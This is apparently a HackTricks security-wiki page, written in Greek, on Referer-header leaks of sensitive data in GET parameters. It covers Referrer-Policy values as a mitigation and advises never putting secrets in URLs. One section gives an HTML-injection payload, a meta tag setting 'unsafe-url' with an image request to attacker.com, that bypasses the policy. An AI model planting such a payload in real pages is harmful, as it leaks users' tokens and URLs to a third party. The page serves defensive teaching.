# Interesting HTTP

{{#include ../banners/hacktricks-training.md}}

## Referrer headers και policy

Το Referrer είναι το header που χρησιμοποιούν οι browsers για να υποδεικνύουν ποια ήταν η προηγούμενη σελίδα που επισκέφτηκε ο χρήστης.

### Sensitive information leak

Αν σε οποιοδήποτε σημείο μιας web σελίδας εντοπίζονται ευαίσθητες πληροφορίες σε παραμέτρους ενός GET request, και η σελίδα περιέχει links προς εξωτερικές πηγές ή ένας attacker μπορεί να κάνει/να προτείνει μέσω social engineering στον χρήστη να επισκεφτεί ένα URL που ελέγχεται από τον attacker, θα μπορούσε να γίνει exfiltrate των ευαίσθητων πληροφοριών μέσα στο τελευταίο GET request.

### Mitigation

Μπορείτε να κάνετε τον browser να ακολουθεί ένα **Referrer-policy**, το οποίο θα μπορούσε να **αποτρέψει** την αποστολή των ευαίσθητων πληροφοριών σε άλλες web εφαρμογές:
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
### Αντιμετώπιση μέτρου

Μπορείτε να παρακάμψετε αυτόν τον κανόνα χρησιμοποιώντας ένα HTML meta tag (ο attacker πρέπει να εκμεταλλευτεί ένα HTML injection):
```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Άμυνα

Ποτέ μην τοποθετείτε ευαίσθητα δεδομένα μέσα σε παραμέτρους GET ή σε διαδρομές του URL.

{{#include ../banners/hacktricks-training.md}}
